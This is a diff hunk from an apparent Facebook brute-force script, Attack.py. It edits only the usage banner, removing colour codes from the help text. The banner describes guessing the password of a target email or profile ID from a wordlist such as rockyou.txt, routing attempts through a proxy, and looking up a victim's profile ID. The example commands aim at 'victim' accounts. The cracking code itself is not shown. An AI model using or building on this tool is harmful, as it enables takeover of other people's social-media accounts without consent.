@@ -226,34 +226,34 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
       print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Other Wordlist File "+gr+":)"+wi)
     exit(1)
 
-parse = optparse.OptionParser(wi+"""
+parse = optparse.OptionParser(yl+"""
 Usage: python ./Attack.py [OPTIONS...]
--------------"+rd+"
+-------------
 OPTIONS:
        |
     |--------    
-    |"+yl+" -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
+    |-t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
     |--------
-    | "+yl+"-w <wordlist Path>                      ::> Specify Wordlist File Path
+    |-w <wordlist Path>                      ::> Specify Wordlist File Path
     |--------
-    | "+yl+"-s <single password>                     ::> Specify Single Password To Check
+    |-s <single password>                     ::> Specify Single Password To Check
     |--------
-    | "+yl+"-p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
+    |-p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
     |--------
-    | "+yl+"-g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
+    |-g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
 -------------
 Examples:
         |
      |--------
-     | "+yl+"python Attack.py "+rd+"-t victim@gmail.com "+gr+"-w /usr/share/wordlists/rockyou.txt
+     | python Attack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
-     | "+yl+"python Attack.py "+rd+"-t 100001013078780 "+gr+"-w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | python Attack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | "+yl+"python Attack.py "+rd+"-t victim@hotmail.com "+gr+"-w D:\\wordlist.txt "+yl+"-p 35.236.37.121 "+gr+"default(port=8080,80) 
+     | python Attack.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
      |--------
-     | "+yl+"python Attack.py "+rd+"-t victim@gmail.com "+gr+"-s 1234567
+     | python Attack.py -t victim@gmail.com -s 1234567
      |-------- 
-     | "+yl+"python Attack.py "+rd+"-g https://www.facebook.com/lovehacker 
+     | python Attack.py -g https://www.facebook.com/lovehacker 
      |-------- 
 """)
 def Main():
